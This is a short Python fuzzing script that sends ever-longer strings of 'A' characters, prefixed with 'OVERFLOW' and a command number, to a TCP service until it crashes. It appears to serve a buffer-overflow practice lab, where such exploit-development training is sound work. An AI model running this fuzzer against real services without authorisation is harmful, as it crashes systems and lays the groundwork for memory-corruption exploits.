#!/usr/bin/env python3

import socket
import time
import sys
import argparse

parser = argparse.ArgumentParser(description="Fuzzing script")
parser.add_argument("--ip", required=True, help="Target IP address")
parser.add_argument("--port", type=int, default=1337, help="Target port (default: 1337)")
parser.add_argument("--prefix", required=True, help="Prefix for the payload")
args = parser.parse_args()

ip = args.ip
port = args.port
prefix = f"OVERFLOW{args.prefix} "

timeout = 5
string = prefix + "A" * 100

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            s.recv(1024)
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            s.send(bytes(string, "latin-1"))
            s.recv(1024)
    except:
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    string += 100 * "A"
    time.sleep(1)
